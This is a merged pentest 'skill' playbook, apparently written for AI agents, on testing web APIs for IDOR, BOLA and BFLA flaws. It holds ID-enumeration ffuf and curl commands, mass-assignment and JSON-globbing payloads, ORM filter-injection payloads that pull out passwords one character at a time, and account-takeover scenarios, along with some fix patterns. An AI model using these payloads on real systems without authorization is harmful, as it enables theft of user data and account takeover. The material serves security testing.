---
name: idor-bola
description: "IDOR and broken object authorization testing playbook. Use when requests expose object identifiers, tenant boundaries, writable fields, or missing object-level authorization checks."
domain: auth-authz
merged: true
merged_from: [hack-skills:idor-broken-object-authorization, hacking-skills:bola-idor, hack-skills:api-authorization-and-bola]
---

# idor-bola

> **Fusionierter Skill** — vereint 3 Quell-Skills zu einem: `hack-skills:idor-broken-object-authorization`, `hacking-skills:bola-idor`, `hack-skills:api-authorization-and-bola`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — idor-broken-object-authorization (337 Zeilen)

# SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: IDOR is the #1 bug bounty finding. This skill covers non-obvious IDOR surfaces, all attack vectors (not just URL params), A-B testing methodology, BOLA vs BFLA distinction, chaining IDOR to higher impact, and what testers repeatedly miss.

---

## 1. IDOR vs BOLA vs BFLA

| Term | Meaning | Impact |
|---|---|---|
| IDOR | Insecure Direct Object Reference | Read/modify other users' data |
| BOLA | Broken Object Level Authorization (OWASP API Top 10 A1) | Same as IDOR, API terminology |
| BFLA | Broken Function Level Authorization | Low-priv user accesses HIGH-PRIV functions (e.g., admin endpoints) |

**Key distinction**: 
- BOLA = accessing **object** you shouldn't own (data belonging to other users)
- BFLA = accessing **function** you shouldn't be authorized for (admin CRUD operations, bulk actions, user management)

---

## 2. WHERE TO FIND OBJECT IDs (ALL LOCATIONS)

Don't stop at URL path parameters — IDs appear in:

```
URL path:        GET /api/v1/users/1234/profile
URL query:       GET /orders?order_id=982
Request body:    {"userId": 1234, "action": "view"}
JSON fields:     {"resource": {"id": 5678, "type": "invoice"}}
Headers:         X-User-ID: 1234
                 X-Account-ID: 9999
Cookies:         user_id=1234; account=org_5678
GraphQL args:    query { user(id: "1234") { ... } }
Form fields:     <input name="documentId" value="5678">
WebSocket msgs:  {"event":"subscribe","channel_id":9999}
```

---

## 3. A-B TESTING METHODOLOGY

The most systematic IDOR test approach:

```
Step 1: Create two test accounts: UserA and UserB
Step 2: Perform all actions as UserA, capture all requests
        (profile edit, order view, password change, file access, etc.)
Step 3: Note every object ID created or accessed by UserA
Step 4: Authenticate as UserB
Step 5: Replay UserA's requests using UserB's session token
Step 6: If UserB can read/modify UserA's data → BOLA confirmed

Victim matters: for real bugs, target existing users, not test accounts.
Report evidence: show UserA owns the resource, UserB accessed it.
```

---

## 4. ID TYPE ITS IMPLICATIONS

| ID Pattern | Example | Notes |
|---|---|---|
| Sequential int | `id=1001` → `id=1002` | Easy prediction, high hit rate |
| UUID v4 | `550e8400-...` | Need to find UUID from other endpoints |
| UUID v1 | Clock-based UUID | Time-predictable! Extract timestamp/MAC |
| GUIDs from own data | See in responses | Collect all UUIDs from your own account data first |
| Hashed IDs | `md5(user_id)` | Try hashing sequential ints |
| Encoded IDs | base64(`{"id":1001}`) | Decode → modify → re-encode |
| Compound IDs | `/api/users/1/orders/5` | Both IDs may be independently verifiable |

---

## 5. HORIZONTAL vs VERTICAL PRIVILEGE ESCALATION

**Horizontal**: UserA accesses UserB's data (same privilege level)
```
GET /api/account/1234/statement     ← you are user 5678
```

**Vertical**: Low-priv user accesses admin-only functions
```
POST /api/admin/users/delete        ← normal user calling admin endpoint
GET /api/admin/all-users
PUT /api/users/1234/role {"role":"admin"}
```

**Combined**: Low-priv IDOR that grants privilege escalation
```
GET /api/v1/users/1/details → read admin user's auth token
```

---

## 6. HTTP METHOD ESCALATION

When `GET /resource/1234` is properly restricted, test ALL other verbs:

```http
GET    /api/v1/users/UserA_ID    ← might be blocked
POST   /api/v1/users/UserA_ID    ← different code path, might not check authz
PUT    /api/v1/users/UserA_ID    ← update another user's data
DELETE /api/v1/users/UserA_ID    ← delete another user's account
PATCH  /api/v1/users/UserA_ID    ← partial update (often missed in authz checks)
```

**Why this works**: Authorization logic is often implemented per-method, and developers forget edge cases.

---

## 7. PARAMETER POLLUTION & TYPE CONFUSION

When `id=1234` is validated, try:
```
id[]=1234&id[]=5678          ← array — app may use first or last
id=5678&id=1234              ← duplicate — app may prefer first or last
{"id": "1234"}               ← string vs int: might hit different code path
{"id": [1234]}               ← array in JSON
{"userId": 1234, "id": 5678} ← two ID fields — which is used for authz?
```

**JSON Type Confusion**:
```json
{"userId": "1234"}   vs   {"userId": 1234}
```
Some ORMs handle string vs integer differently in queries.

---

## 8. BFLA (FUNCTION LEVEL) ATTACKS

### Common BFLA Endpoints to Test

```http
# User management (admin-only in design):
GET /api/v1/admin/users
DELETE /api/v1/users/{any_user_id}
PUT /api/v1/users/{user_id}/role

# Bulk operations:
POST /api/v1/users/bulk-delete
GET /api/v1/export/all-data

# Billing/payment admin:
POST /api/v1/admin/subscription/modify
GET /api/v1/admin/payments/all

# Internal reporting:
GET /api/v1/reports/all-users-activity
```

### How to Find Hidden Admin Endpoints
1. Read JS bundles — admin routes often exposed in frontend code
2. Look at API docs (Swagger/OpenAPI) for "admin", "internal", "privileged" tags
3. Enumerate `/api/v1/admin/**`, `/api/v1/manage/**`, `/api/v1/internal/**`
4. Burp "Discover Content" on API base path
5. Compare regular user docs vs admin section docs if available

---

## 9. INDIRECT IDOR (REFERENCE CHAIN)

App checks permission on **object A** but doesn't check ownership of **referenced object B**:

**Example**:
```
UserA has permission to read their own messages.
GET /api/messages/1234 → checks: "does user own message 1234?" ✓

But: messages have attachments.
GET /api/attachments/5678 → doesn't check: "does attachment belong to message owned by user?"
```

Test: access attachments/sub-resources directly via their IDs without going through parent endpoint.

**GraphQL variant**: Inline querying related objects without separate authorization:
```graphql
query {
  myProfile {
    followers {
      privateEmail    ← accessing private field of OTHER users via relationship
    }
  }
}
```

---

## 10. MASS ASSIGNMENT → PRIVILEGE ESCALATION

When POST/PUT takes a JSON body, properties in the underlying model may be settable even if not in the official API docs:

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",          ← hidden field
  "isAdmin": true,          ← hidden field
  "verified": true,         ← skip email verification
  "creditBalance": 9999     ← give self credits
}
```

**How to find hidden fields**:
1. Intercept admin "create user" vs normal "register" — diff the fields
2. Read API documentation for all possible fields
3. Check source code if available (GitHub, JS bundles)
4. Fuzz with Burp: add common property names and check for `200` vs `400`

---

## 11. STATE MACHINE ABUSE (BUSINESS LOGIC IDOR)

When resources have a status/state:
```
order.status: pending → confirmed → shipped → delivered
```

Test: Can you skip states?
```
PUT /api/orders/1234 {"status": "delivered"}  ← from "pending"
PUT /api/orders/1234 {"status": "refunded"}   ← from "pending" (skip shipped)
```

Can you set another user's order status?
```
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← as UserB
```

---

## 12. QUICK IDOR CHECKLIST

```
□ Create 2 accounts (UserA + UserB)
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own)
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status field modification
```

---

## 13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES

| # | Category | Test Method |
|---|---|---|
| 1 | Direct ID reference | Change numeric/UUID ID in URL: `/api/users/123` → `/api/users/124` |
| 2 | Predictable UUID | If UUIDs are v1 (time-based), adjacent IDs are calculable |
| 3 | Batch/bulk operations | `/api/users/bulk?ids=123,456` — add other users' IDs |
| 4 | Export/download | Export endpoint leaks other users' data: `/export?user_id=*` |
| 5 | Linked object IDOR | Change `order.address_id` to another user's address |
| 6 | Resource replacement | Update own profile with another user's resource ID → overwrites |
| 7 | Write IDOR | PUT/PATCH/DELETE with other user's ID — modify/delete their data |
| 8 | Nested object | `/api/orgs/1/users/2` — change org ID to access other org's users |

### Testing Flow

```
1. Create two test accounts (A and B)
2. Perform all CRUD operations as A, capture all request IDs
3. Replay each request replacing A's IDs with B's IDs
4. Check: Can A read B's data? Modify? Delete?
5. Test with: numeric IDs, UUIDs, slugs, encoded values
6. Test across: URL path, query params, JSON body, headers
```

---

## 14. ORM FILTER CHAIN LEAKS

### Django ORM Filter Injection

```python
# Vulnerable: User.objects.filter(**request.data)
# Attacker sends: {"password__startswith": "a"}
# Django translates to: WHERE password LIKE 'a%'

# Character-by-character extraction:
POST /api/users/
{"username": "admin", "password__startswith": "a"}   → 200 (match)
{"username": "admin", "password__startswith": "b"}   → 404 (no match)
# Iterate through charset for each position

# Relational traversal:
{"author__user__password__startswith": "a"}
# Traverses: Author → User → password field

# On MySQL: ReDoS via regex
{"email__regex": "^(a+)+$"}  → CPU spike if match exists
```

### Prisma Filter Injection

```json
// Vulnerable: prisma.user.findMany({ where: req.body })
// Attacker sends nested include/select:
{
  "include": {
    "posts": {
      "include": {
        "author": {
          "select": {"password": true}
        }
      }
    }
  }
}
// Leaks password field through relation traversal
```

### Ransack (Ruby on Rails)

```
# Ransack allows search predicates via query params:
GET /users?q[password_cont]=admin
# Searches: WHERE password LIKE '%admin%'

# Character extraction:
GET /users?q[password_start]=a   → count results
GET /users?q[password_start]=ab  → narrow down
# Tool: plormber (automated Ransack extraction)
```

## Quelle: hacking-skills — bola-idor (155 Zeilen)

# Broken Object Level Authorization (BOLA / IDOR)

## What Is Broken and Why

The server accepts a resource identifier from the client and fetches the object without
verifying the requesting user owns or has access to it. Authorization is enforced at the
route level ("is this user logged in?") but not at the object level ("does this user own
object 1042?"). An attacker substitutes their identifier for a victim's to read, modify,
or delete resources they should never access. BOLA is consistently the #1 OWASP API Security
risk because it is trivial to test and almost always yields high-severity findings.

## Key Signals

- Numeric or sequential IDs in URL path: `/api/orders/1042`, `/users/7/profile`
- UUIDs or hashes in query params or body referencing another user's object
- Parameters named `user_id`, `account_id`, `owner_id`, `ref`, `target_id`, `invoice`
- Write operations (PUT/PATCH/DELETE) accepting an object ID
- Export/download/share endpoints with a resource ID parameter
- Keywords `me` or `current` used as ID aliases — swappable for integer IDs
- Older API versions still accessible: `/v1/`, `/v2/`, `/legacy/`
- UUIDs discoverable via public profiles, share links, password reset flows, Wayback Machine

## Methodology

1. Map all object identifiers across the entire app — URLs, query params, request body, cookies, headers.
2. Create two accounts with distinctive names (e.g. `attacker_a`, `victim_b`). Use separate browsers to keep sessions fully isolated. Fully populate the victim account with varied resources and document all encountered IDs. Capture all requests with the victim session.
3. Replay each request using the attacker token with the victim's object IDs.
4. Compare responses — same data returned = BOLA confirmed.
5. Test unauthenticated: remove `Authorization` header entirely.
6. Test write operations (PUT/PATCH/DELETE) — impact is higher than reads.
7. Test indirect references: export endpoints, share links, scheduled jobs, email triggers.
8. Test less-visible features: auto-save, draft, notification, audit log, attachment endpoints.
9. Try older API versions (`/v1/`, `/beta/`) which often lack access control patches.
10. For second-order IDOR: store a payload referencing victim's ID, trigger async processing, observe outcome.

## Payloads & Tools

```bash
# ffuf: fuzz numeric IDs around your own
ffuf -w <(seq 1000 2000) -u https://TARGET/api/users/FUZZ \
  -H "Authorization: Bearer YOUR_TOKEN" -mc 200 -fs 0

# curl: direct ID swap
curl -s https://TARGET/api/orders/VICTIM_ID \
  -H "Authorization: Bearer YOUR_TOKEN"

# Append .json to bypass access control
curl https://TARGET/api/receipts/VICTIM_ID.json \
  -H "Authorization: Bearer YOUR_TOKEN"

# Try deprecated API version
curl https://TARGET/v1/users/VICTIM_ID \
  -H "Authorization: Bearer YOUR_TOKEN"
```

```
# Burp Intruder: fuzz ±1000 around your own ID
GET /api/orders/§1042§ HTTP/1.1
Authorization: Bearer YOUR_TOKEN

# JSON globbing in request body
{"user_id": [YOUR_ID, VICTIM_ID]}
{"user_id": "*"}
{"user_id": true}
{"user_id": 0}
{"user_id": -1}
{"user_id": 1235.0}
```

**Burp extension: Autorize** — automatically replaces session token with low-priv token on every request, flags unexpected 200s and response diffs.

## Bypass Techniques

- **JSON globbing**: replace ID with `[id1, id2]`, `*`, `true`, `0`, `-1`, `1234.0` — parsers may match all
- **HTTP verb swap**: GET blocked → try POST, PUT, DELETE, PATCH on same path
- **Parameter pollution**: `?user_id=YOURS&user_id=VICTIM` — server may process last or first
- **Encoded references**: base64/hex decode the ID, increment, re-encode — app trusts encoding as security
- **Alternate field names**: `owner_id`, `account_id`, `ref`, `target`, `resource_id`, `parent_id`
- **Path traversal**: `/api/users/YOURS/../VICTIM`
- **Static keyword swap**: replace `me` or `current` with a numeric ID
- **Content-type switch**: JSON endpoint may behave differently with `application/x-www-form-urlencoded`
- **Second-order**: store a reference to victim's ID in a field, trigger async job that processes it without re-checking auth
- **Append extension**: `/resource/VICTIM_ID.json`, `.xml`, `.csv` may skip access control middleware

## Exploitation Scenarios

**Scenario 1 — Account takeover via email change**
Setup: `PUT /api/users/{id}` accepts `email` as an editable field, no ownership check.
Trigger: Attacker replaces their own `id` with victim's `id` in the request body.
Impact: Victim's email changed to attacker's address → password reset → full account takeover.

**Scenario 2 — Mass PII leak via sequential ID**
Setup: `/api/orders/{id}` returns full order: name, address, card last4, phone.
Trigger: Attacker iterates integer IDs from 1 to N with their own session token.
Impact: Thousands of customers' PII and payment metadata exfiltrated via scripted enumeration.

**Scenario 3 — Second-order IDOR via scheduled export**
Setup: App lets users schedule data exports; export job runs async and emails result.
Trigger: Attacker sets `export_for_user_id=VICTIM_ID` in the schedule request.
Impact: Victim's full data export emailed to attacker — no access control on the async job.

## False Positives

- API returns 200 but with empty or redacted data — access control is working, just silent
- Public resources (product listings, public profiles) — no authorization expected by design
- Response identical regardless of ID — server reads from session context, ID param is ignored
- `me` and `current` aliases that correctly resolve to the authenticated user only

## Fix Patterns

```sql
-- Correct: ownership enforced at query level
SELECT * FROM orders WHERE id = ? AND user_id = current_user_id()
```

```python
# Wrong: fetch then check (inefficient + race-prone)
order = db.find(id)
if order.user_id != current_user:
    raise Forbidden()

# Correct: indirect reference map (never expose raw DB IDs)
user_resource_map = {session_token: [allowed_id_1, allowed_id_2]}
if requested_id not in user_resource_map[session_token]:
    raise Forbidden()
```

- Use indirect reference maps: expose opaque tokens that map server-side to real IDs
- Centralize authorization in middleware — one place, not scattered per-route
- Apply access control consistently across ALL HTTP methods and API versions
- Disable or equally secure deprecated API versions

## Related Skills

[[authz-bypass]] covers the broader authorization failure class — BOLA is its most common manifestation. When the application uses GraphQL, [[graphql-idor-via-introspection-leak]] shows how to enumerate the schema to find every object type accepting an ID argument. [[path-traversal]] is an IDOR on the filesystem: the same "reference to a resource without ownership check" pattern applied to file paths. IDOR findings frequently reveal [[business-logic-flaws]] — such as skipping payment by referencing another order's paid state.

## Quelle: hack-skills — api-authorization-and-bola (48 Zeilen)

# SKILL: API Authorization and BOLA — Object Access, Function Access, and Mass Assignment

> **AI LOAD INSTRUCTION**: Use this skill when an API exposes object IDs, nested resources, or role-sensitive functions and you need a focused authorization test path: BOLA, BFLA, method abuse, and hidden field control.

## 1. CORE TEST LOOP

1. Create Account A and Account B.
2. As Account A, capture create, read, update, and delete flows.
3. Replay with Account B's token.
4. Test sibling endpoints, nested endpoints, and alternate HTTP verbs.

## 2. TEST SURFACES

| Surface | Example |
|---|---|
| object read | `/api/v1/orders/123` |
| nested object | `/api/v1/users/1/invoices/9` |
| admin or internal function | `/api/v1/admin/users` |
| update path | `PUT`, `PATCH`, `DELETE` variants |
| hidden JSON fields | `role`, `org`, `verified`, `tier` |

## 3. QUICK PAYLOADS

```json
{"role":"admin"}
{"isAdmin":true}
{"org":"target-company"}
{"verified":true}
```

## 4. WHAT TESTERS MISS

- object IDs in headers, cookies, GraphQL args, and nested objects
- alternate methods sharing the same route but weaker authz
- parent check present, child resource check missing
- admin docs revealing extra writable fields

## 5. NEXT ROUTING

- For JWT or token-layer abuse: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)
- For GraphQL and hidden parameter discovery: [graphql and hidden parameters](../graphql-and-hidden-parameters/SKILL.md)
- For broader IDOR patterns outside APIs: [idor broken object authorization](../idor-broken-object-authorization/SKILL.md)
